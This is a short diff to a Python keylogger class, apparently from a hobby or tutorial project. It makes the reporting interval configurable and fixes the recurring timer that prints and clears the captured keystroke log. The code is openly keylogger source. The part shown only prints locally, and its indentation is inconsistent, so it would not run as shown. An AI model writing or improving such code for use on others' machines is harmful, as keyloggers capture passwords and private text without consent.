@@ -6,8 +6,9 @@ import threading
 
 class Keylogger:
 
-def __init__(self):
-   self.log=""
+def __init__(self,time_interval):
+      self.log=""
+      self.interval=time_interval
 
 def append_to_log(self,string):
     self.log=self.log+string
@@ -29,7 +30,7 @@ def process_key_press(self,key):
 def report(self): 
     print(self.log)
     self.log=" "
-    timer=threading.Timer(5, report)
+    timer=threading.Timer(self.interval, self.report)
     timer.start()
 
 def start(self):
